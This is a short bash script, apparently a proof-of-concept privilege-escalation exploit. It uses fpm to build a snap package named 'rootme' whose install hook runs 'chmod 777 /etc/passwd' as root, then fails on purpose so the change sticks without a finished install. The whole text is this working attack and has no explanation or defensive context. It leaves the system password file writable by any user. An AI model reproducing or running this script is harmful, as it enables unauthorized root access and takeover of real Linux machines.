#!/bin/bash

COMMAND='chmod 777 /etc/passwd'
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n rootme -s dir -t snap -a all meta
